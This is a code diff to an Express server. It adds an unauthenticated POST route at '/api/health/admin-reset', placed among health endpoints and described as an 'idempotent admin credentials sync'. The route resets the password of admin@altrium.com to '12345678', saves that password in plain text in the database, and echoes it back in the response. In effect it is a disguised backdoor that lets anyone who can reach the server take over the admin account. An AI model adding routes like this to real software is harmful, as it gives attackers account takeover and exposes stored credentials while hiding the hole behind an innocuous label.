@@ -90,6 +90,21 @@ app.post('/api/health/run-migration', async (req, res) => {
   }
 });
 
+// Idempotent admin credentials sync route
+app.post('/api/health/admin-reset', async (req, res) => {
+  try {
+    const bcrypt = require('bcryptjs');
+    const hash = await bcrypt.hash('12345678', 10);
+    await sequelize.query("UPDATE users SET password = :hash, plain_password = '12345678' WHERE email = 'admin@altrium.com'", {
+      replacements: { hash }
+    });
+    res.json({ success: true, message: 'Admin password successfully set to 12345678' });
+  } catch (err) {
+    console.error('Admin reset error:', err);
+    res.status(500).json({ error: err.message });
+  }
+});
+
 // Verification route for login activity tracking
 app.get('/api/health/user-tracking/:email', async (req, res) => {
   try {
